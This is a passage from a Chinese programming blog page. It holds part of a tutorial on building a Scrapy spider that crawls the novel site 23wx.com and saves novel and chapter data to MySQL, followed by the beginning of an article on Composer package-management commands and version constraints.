href="http://www.23wx.com/class/9_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/9_1.html</a> 其他：<a href="http://www.23wx.com/class/10_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/10_1.html</a> 全本：<a href="http://www.23wx.com/quanben/1" target="_blank" rel="noopener">http://www.23wx.com/quanben/1</a> 好啦！入口地址我们找到了，现在开始写第一部分代码： 当然对于上面的地址，我们是可以直接全使用 Start_urls 这种列表全部请求，不过并不太美观，我需要把其中，有规律的部分，单独其他方式实现，比如字典之类的： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy22.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy22.png" alt="Scrapy22"></a> 第十行：首先我们创建一个类 Myspider；这个类继承自 scrapy.Spider（当然还有一些其他父类，继承各个父类后能实现的功能不一样）； 第十二行：我们定义 name：dingdian （请注意，这 name 就是我们在 entrypoint.py 文件中的第三个参数！）！！！！<strong>请务必注意：此 Name 的！名字！在整个项目中有且只能有一个、名字不可重复！！！！</strong> 第十一行：我们定义了一个 allowed_domains；这个不是必须的；但是在某写情况下需要用得到，比如使用爬取规则的时候就需要了；它的作用是只会跟进存在于 allowed_domains 中的 URL。不存在的 URL 会被忽略。 第十七行到第十九行：我们使用字符串拼接的方式实现了我们上面发现的全部 URL。 第二十行和二十一行：我们使用了导入的 Request 包，来跟进我们的 URL（并将返回的 response 作为参数传递给 self.parse, 嗯！这个叫<strong>回调函数</strong>！） 第二十三行：使用 parse 函数接受上面 request 获取到的 response。（请务必注意：不要轻易改写 parse 函数（意思就是不要把 parse 函数用作它用）；因为这样 request 的回调函数被你用了，就没谁接受 request 返回的 response 啦！如果你非要用作它用，则需要自己给 request 一个回调函数哦！）</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> scrapy <span class="comment">#导入scrapy包</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> Request <span class="comment">##一个单独的request的模块，需要跟进URL的时候，需要用它</span></span><br><span class="line"><span class="keyword">from</span> dingdian.items <span class="keyword">import</span> DingdianItem <span class="comment">##这是我定义的需要保存的字段，（导入dingdian项目中，items文件中的DingdianItem类）</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myspider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line"></span><br><span class="line">    name = <span class="string">'dingdian'</span></span><br><span class="line">    allowed_domains = [<span class="string">'23wx.com'</span>]</span><br><span class="line">    bash_url = <span class="string">'http://www.23wx.com/class/'</span></span><br><span class="line">    bashurl = <span class="string">'.html'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_requests</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">            url = self.bash_url + str(i) + <span class="string">'_1'</span> + self.bashurl</span><br><span class="line">            <span class="keyword">yield</span> Request(url, self.parse)</span><br><span class="line">        <span class="keyword">yield</span> Request(<span class="string">'http://www.23wx.com/quanben/1'</span>, self.parse)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们测试一下是否正常工作：在 IDE 中运行我们之前创建的 entrypoint.py 文件（如果没有这个文件是不能在 IDE 中运行的哦！ヽ(=^･ω･^=)丿） 然后会像这样： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/Spider编写03.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/Spider编写03.png" alt="Spider编写03"></a> 你会发现在红色状态报告之后，所有页面几乎是一瞬间出现的；那是因为 Scrapy 使用了异步啦！ヽ(°◇° )ノ 另外因为 Scrapy 遵循了 robots 规则，如果你想要获取的页面在 robots 中被禁止了，Scrapy 是会忽略掉的哦！！ヾ(。￣ □ ￣)ﾂ゜゜゜ 请求就这么轻而易举的实现了啊！简直 So Easy！ 继续 继续！ 我们需要历遍所有页面才能取得所有的小说页面连接： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/分析网页2.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/分析网页2.png" alt="分析网页2"></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/分析网页01.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/分析网页01.png" alt="分析网页01"></a> 每个页面的这个位置都是最后一个页面，我们提取出它，历遍就可以拼接出一个完整的 URL 了ヾ§ ￣ ▽)ゞ 2333333 Go Go <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy20.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy20.png" alt="Scrapy20"></a> 第二十三行：def parse(self, response)这个函数接受来在二十一行返回的 response，并处理。 第二十四行：我们使用 BS4 从 response 中获取到了最大页码。 第二十五行至二十七行：我们照例拼接了一个完整的 URL（response.url:就是这个 response 的 URL 地址） 第二十八行：功能和第二十行一样，callback= 是指定回调函数，不过不写 callback=也没有什么影响！ 注意我只是说的 callback=这个几个；不是后面的 self.get_name. 看清楚了 response 是怎么用的没？ヾ§ ￣ ▽)ゞ 2333333 是不是 So Easy？ 如果不清楚那个拼接 URL 的小伙伴可以打印出来，看看哦··· 再去观察一下网页，就很明白啦 上面两个函数就彻底的把整个网站的所有小说的页面 URL 的提取出来了，并将每个页面的 response 交给了 get_name 函数处理哦！ 现在我们的爬虫就开始处理具体的小说了哦： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy07.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy07.png" alt="Scrapy07"></a> 瞅见没 我们需要的东西，快用 F12 工具看一下吧，在什么位置有什么标签，可以方便我们提取数据。还不知道怎么看的小伙伴，去看看妹子图那个教程，有教哦；实在不行百度一下也行！ 过程忽略了，直接上代码（主要是懒癌来了）： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy09.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy09.png" alt="Scrapy09"></a> 前面三行不说了， 第三十七和三十八行：是我们的小说名字和 URL 第三十九行和第四十行；大伙儿可能会发现，多了个一个 meta 这么一个字典，这是 Scrapy 中传递额外数据的方法。因我们还有一些其他内容需要在下一个页面中才能获取到。 下面我的爬虫进入了这个页面： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy10.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy10.png" alt="Scrapy10"></a> 这个页面就有很多我们需要的信息了：废话不说了代码上来： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy11.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy11.png" alt="Scrapy11"></a> 第四十行：将我们导入的 item 文件进行实例化，用来存储我们的数据。 后面全部：将需要的数据，复制给 item[key] (注意这儿的 Key 就是我们前面在 item 文件中定义的那些字段。) 注意！response.meta[key]：这个是提取从上一个函数传递下来的值。 return item 就是返回我们的字典了，然后 Pipelines 就可以开始对这些数据进行处理了。比如 存储之类的。 好啦，Spiders 我们先编写到这个地方。（是不是有小伙伴发现我还有几个字段没有取值？当然留着你们自己试试了，哈哈哈ヽ(=^･ω･^=)丿）后面再继续。 我现在教教大家怎么处理这些数据：对头就是说说 Pipeline 了： 对于基本的 Pipeline 存储方式，网上有很多教程了，今天我们做一个自定义的 MySQL 的 Pipeline： 首先为了能好区分框架自带的 Pipeline，我们把 MySQL 的 Pipeline 单独放到一个目录里面。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy12.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy12.png" alt="Scrapy12"></a> 我们在项目中新建了一个 mysqlpipelines 的文件夹，我们所有的 MySQL 文件都放在这个目录。 <strong>init</strong>.py 这个文件不需要我说了吧，不知道做啥的小哥儿自己百度。 pipelines.py 这个是我们写存放数据的文件 sql.py 看名字就知道，需要的 sql 语句。 首先是需要的 MySQL 表，（MySQL 都没有的小哥儿 自己百度装一个啊，我就不教了）</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">DROP TABLE <span class="keyword">IF</span> EXISTS `dd_name`;</span><br><span class="line">CREATE TABLE `dd_name` (</span><br><span class="line">  `id` int(11) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `xs_name` varchar(255)<span class="built_in"> DEFAULT </span><span class="literal">NULL</span>,</span><br><span class="line">  `xs_author` varchar(255)<span class="built_in"> DEFAULT </span><span class="literal">NULL</span>,</span><br><span class="line">  `category` varchar(255)<span class="built_in"> DEFAULT </span><span class="literal">NULL</span>,</span><br><span class="line">  `name_id` varchar(255)<span class="built_in"> DEFAULT </span><span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) <span class="attribute">ENGINE</span>=InnoDB <span class="attribute">AUTO_INCREMENT</span>=38<span class="built_in"> DEFAULT </span><span class="attribute">CHARSET</span>=utf8mb4;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>首先我们再 settings.py 文件中定义好 MySQL 的配置文件（当然你也可以直接定义在 sql.py 文件中）： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/MySQL-setting.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/MySQL-setting.png" alt="MySQL setting"></a> <strong>PS :注意 MySQL 的默认端口是 3306；我自己的 MySQL 改成了 3389。这儿各位酌情自己更改。</strong> 在开始写 sql.py 之前，我们需要安装一个 Python 操作 MySQL 的包，来自 MySQL 官方的一个包：<a href="http://cdn.mysql.com//Downloads/Connector-Python/mysql-connector-python-2.1.4.zip" target="_blank" rel="noopener">点我下载</a> 下载完成后解压出来，从 CMD 进入该目录的绝对路径，然后 Python setup.py install ；即可完成安装 下面是我们的 sql.py 文件： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/sql01.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/sql01.png" alt="sql01"></a> 第一行至第二行分别导入了：我的 MySQL 操作包，settings 配置文件 第四行至第八行 ： 从 settings 配置文件中获取到了，我们的 MySQL 配置文件 第十行至第十一行： 初始化了一个 MySQL 的操作游标 第十三行： 定义了一个 Sql 的类 第十六行至第二十五行：定义了一个函数，将函数中的四个变量写入数据库（这四个变量就是我们后面传进来的需要存储的数据。） <strong>关于@classmethod 这个是一个修饰符；作用是我们不需要初始化类就可以直接调用类中的函数使用（具体说起来麻烦，知道作用就好啦）</strong> 好了第一部分写完了，我们还需要一个能够去重的： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/sql01-1.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/sql01-1.png" alt="sql01"></a> 这一段代码会查找 name_id 这个字段，如果存在则会返回 1 不存在则会返回 0 Nice！sqi.py 这一部分我们完成，来开始写 pipeline 吧： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/pipeline02.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/pipeline02.png" alt="pipeline02"></a> 第一行至第二行：我们导入了之前编写的 sql.py 中的 Sql 类，和我们建立的 item 第六行：建立了一个 DingdianPipeline 的类（别忘了一定要继承 object 这个类啊，这是做啥的不用多了解，说多了你们头晕，我也懒） 第八行：我们定义了一个 process_item 函数并有，item 和 spider 这两个参数（请注意啊！这两玩意儿 务必！！！要加上！！千万不能少！！！！务必！！！务必！！！） 第十行：你这样理解如果在 item 中存在 DingdianItem；就执行下面的。 第十一行：从 item 中取出 name_id 的值。 第十二行：调用 Sql 中的 select_name 函数获得返回值 第十三行：判断 ret 是否等于 1 ，是的话证明已经存了 第二十行：调用 Sql 中的 insert_dd_name 函数，存储上面几个值。 搞完！下面我们启用这个 Pipeline 在 settings 中作如下设置： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/setting02.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/setting02.png" alt="setting02"></a> <strong>PS: dingdian（项目目录）.mysqlpipelines（自己建立的 MySQL 目录）.pipelines（自己建立的 pipelines 文件）.DingdianPipeline（其中定义的类） 后面的 1 是优先级程度（1-1000 随意设置，数值越低，组件的优先级越高）</strong> 好！我们来运行一下试试！！Go Go Go！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy15.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy15.png" alt="scrapy15"></a> Nice!!完美！！我之前运行过了 所以提示已经存在。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy17.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy17.png" alt="scrapy17"></a> 下面我们开始还剩下的一些内容获取：小说章节 和章节内容 首先我们在 item 中新定义一些需要获取内容的字段： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy16.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy16.png" alt="scrapy16"></a> 代码不解释了哦！（懒癌来了，写不下去了） 继续编写 Spider 文件： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy18.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy18.png" alt="scrapy18"></a> 请注意我图中画红框的的地方，这个地方返回 item 是不能用 return 的哦！用了就结束了，程序就不会继续下去了，得用 yield（你知道就行，这玩意儿说起来麻烦。） 第五十八行： num 这个变量的作用是 因为 Scrapy 是异步的方式运作，你采集到的章节顺序都是混乱的，需要给它有序的序列，我们按照这个排序就能得到正确的章节顺序啦 请注意在顶部导入定义的第二个 item 类！ 下面我们来写存储这部分 spider 的 Pipeline： 数据表：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">DROP TABLE <span class="keyword">IF</span> EXISTS `dd_chaptername`;</span><br><span class="line">CREATE TABLE `dd_chaptername` (</span><br><span class="line">  `id` int(11) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `xs_chaptername` varchar(255)<span class="built_in"> DEFAULT </span><span class="literal">NULL</span>,</span><br><span class="line">  `xs_content` text,</span><br><span class="line">  `id_name` int(11)<span class="built_in"> DEFAULT </span><span class="literal">NULL</span>,</span><br><span class="line">  `num_id` int(11)<span class="built_in"> DEFAULT </span><span class="literal">NULL</span>,</span><br><span class="line">  `url` varchar(255)<span class="built_in"> DEFAULT </span><span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) <span class="attribute">ENGINE</span>=InnoDB <span class="attribute">AUTO_INCREMENT</span>=2726<span class="built_in"> DEFAULT </span><span class="attribute">CHARSET</span>=gb18030;</span><br><span class="line"><span class="builtin-name">SET</span> <span class="attribute">FOREIGN_KEY_CHECKS</span>=1;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>Sql.py: <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy13.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy13.png" alt="Scrapy13"></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy14.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy14.png" alt="Scrapy14"></a> 不解释了哦！ 下面是 Pipeline： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy21.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy21.png" alt="scrapy21"></a> 有小伙伴注意，这儿比上面一个 Pipeline 少一个判断，因为我把判断移动到 Spider 中去了，这样就可以减少一次 Request，减轻服务器压力。 改变后的 Spider 长这样： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy16.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy16.png" alt="Scrapy16"></a> 别忘了在 spider 中导入 Sql 哦！ヾ(。￣ □ ￣)ﾂ゜゜゜ 到此收工！！！！ 至于小说图片，因为 Scrapy 的图片下载管道，是自动以 md5 命名，而且感觉不爽··· 后面单独写一个异步下载的脚本··· <a href="https://github.com/thsheep/dingdian" target="_blank" rel="noopener">https://github.com/thsheep/dingdian</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-12-07 16:44:48" itemprop="dateCreated datePublished" datetime="2016-12-07T16:44:48+08:00">2016-12-07</time>
                </span>
                <span id="/3472.html" class="post-meta-item leancloud_visitors" data-flag-title="小白进阶之Scrapy第一篇" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>8.7k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>8 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3494.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> PHP <i class="label-arrow"></i>
                  </a>
                  <a href="/3494.html" class="post-title-link" itemprop="url">Composer进阶使用之常用命令和版本约束</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>这篇文章主要介绍一些常用的包管理命令以及包的版本如何进行约束。</p>
                  <h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2>
                  <h3 id="require命令"><a href="#require命令" class="headerlink" title="require命令"></a>require命令</h3>
                  <p>在《Composer快速入门》中已经简单介绍过使用<code>install</code>命令安装依赖的方式。除了<code>install</code>命令，我们还可以使用<code>require</code>命令快速的安装一个依赖而不需要手动在<code>composer.json</code>里添加依赖信息：</p>
                  <figure class="highlight sql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">$ composer require monolog/monolog</span><br><span class="line">Using version ^1.19 for monolog/monolog</span><br><span class="line">./composer.json has been updated</span><br><span class="line">Loading composer repositories <span class="keyword">with</span> <span class="keyword">package</span> information</span><br><span class="line">Updating dependencies (<span class="keyword">including</span> require-dev)</span><br><span class="line">  - Installing psr/<span class="keyword">log</span> (<span class="number">1.0</span><span class="number">.0</span>)</span><br><span class="line">    Downloading: <span class="number">100</span>%         </span><br><span class="line"></span><br><span class="line">  - Installing monolog/monolog (<span class="number">1.19</span><span class="number">.0</span>)</span><br><span class="line">    Downloading: <span class="number">100</span>%         </span><br><span class="line"></span><br><span class="line">monolog/monolog suggests installing graylog2/gelf-php (<span class="keyword">Allow</span> sending <span class="keyword">log</span> messages <span class="keyword">to</span> a GrayLog2 <span class="keyword">server</span>)</span><br><span class="line">......</span><br><span class="line">monolog/monolog suggests installing php-console/php-console (<span class="keyword">Allow</span> sending <span class="keyword">log</span> messages <span class="keyword">to</span> Google Chrome)</span><br><span class="line">Writing <span class="keyword">lock</span> <span class="keyword">file</span></span><br><span class="line">Generating autoload files</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>Composer会先找到合适的版本，然后更新<code>composer.json</code>文件，在<code>require</code>那添加<code>monolog/monolog</code>包的相关信息，再把相关的依赖下载下来进行安装，最后更新<code>composer.lock</code>文件并生成php的自动加载文件。</p>
                  <h3 id="update命令"><a href="#update命令" class="headerlink" title="update命令"></a>update命令</h3>
                  <p>通过<code>update</code>命令，可以更新项目里所有的包，或者指定的某些包。</p>
                  <figure class="highlight elixir">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># 更新所有依赖</span></span><br><span class="line"><span class="variable">$ </span>composer update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新指定的包</span></span><br><span class="line"><span class="variable">$ </span>composer update monolog/monolog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新指定的多个包</span></span><br><span class="line"><span class="variable">$ </span>composer update monolog/monolog symfony/dependency-injection</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以通过通配符匹配包</span></span><br><span class="line"><span class="variable">$ </span>composer update monolog/monolog symfony/*</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>需要注意的时，包能升级的版本会受到版本约束的约束，包不会升级到超出约束的版本的范围。例如如果<code>composer.json</code>里包的版本约束为<code>^1.10</code>，而最新版本为2.0。那么<code>update</code>命令是不能把包升级到2.0版本的，只能最高升级到1.x版本。关于版本约束请看后面的介绍。</p>
                  <h3 id="remove命令"><a href="#remove命令" class="headerlink" title="remove命令"></a>remove命令</h3>
                  <p>使用remove命令可以移除一个包及其依赖（在依赖没有被其他包使用的情况下）：</p>
                  <figure class="highlight sql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">$ composer remove monolog/monolog</span><br><span class="line">Loading composer repositories <span class="keyword">with</span> <span class="keyword">package</span> information</span><br><span class="line">Updating dependencies (<span class="keyword">including</span> require-dev)</span><br><span class="line">  - Removing monolog/monolog (<span class="number">1.19</span><span class="number">.0</span>)</span><br><span class="line">  - Removing psr/<span class="keyword">log</span> (<span class="number">1.0</span><span class="number">.0</span>)</span><br><span class="line">Writing <span class="keyword">lock</span> <span class="keyword">file</span></span><br><span class="line">Generating autoload files</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="search命令"><a href="#search命令" class="headerlink" title="search命令"></a>search命令</h3>
                  <p>使用<code>search</code>命令可以进行包的搜索：</p>
                  <figure class="highlight vim">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">$ composer <span class="built_in">search</span> monolog</span><br><span class="line">monolog/monolog Sends your logs <span class="keyword">to</span> <span class="keyword">files</span>, sockets, inboxes, databases <span class="built_in">and</span> various web services</span><br><span class="line"></span><br><span class="line"># 如果只是想匹配名称可以使用--<span class="keyword">only</span>-name选项</span><br><span class="line">$ composer <span class="built_in">search</span> --<span class="keyword">only</span>-name monolog</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="show命令"><a href="#show命令" class="headerlink" title="show命令"></a>show命令</h3>
                  <p>使用<code>show</code>命令可以列出项目目前所安装的包的信息：</p>
                  <figure class="highlight elixir">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># 列出所有已经安装的包</span></span><br><span class="line"><span class="variable">$ </span>composer show</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过通配符进行筛选</span></span><br><span class="line"><span class="variable">$ </span>composer show monolog/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示具体某个包的信息</span></span><br><span class="line"><span class="variable">$ </span>composer show monolog/monolog</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>以上是常用命令的介绍。</p>
                  <h2 id="版本约束"><a href="#版本约束" class="headerlink" title="版本约束"></a>版本约束</h2>
                  <p>前面说到，我们可以指定要下载的包的版本。例如我们想要下载版本1.19的monolog。我们可以通过<code>composer.json</code>文件：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"monolog/monolog"</span>: <span class="string">"1.19"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后运行<code>install</code>命令，或者通过<code>require</code>命令达到目的：</p>
                  <figure class="highlight elixir">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="variable">$ </span>composer <span class="keyword">require</span> monolog/<span class="symbol">monolog:</span><span class="number">1.19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="variable">$ </span>composer <span class="keyword">require</span> monolog/monolog=<span class="number">1.19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="variable">$composer</span> <span class="keyword">require</span> monolog/monolog <span class="number">1.19</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>除了像上面那样指定具体的版本，我们还可以通过不同的约束方式去指定版本。</p>
                  <h3 id="基本约束"><a href="#基本约束" class="headerlink" title="基本约束"></a>基本约束</h3>
                  <h4 id="精确版本"><a href="#精确版本" class="headerlink" title="精确版本"></a>精确版本</h4>
                  <p>可以指定具体的版本，告诉Composer只能安装这个版本。但是如果其他的依赖需要用到其他的版本，则包的安装或者更新最后会失败并终止。 例子：<code>1.0.2</code></p>
                  <h4 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h4>
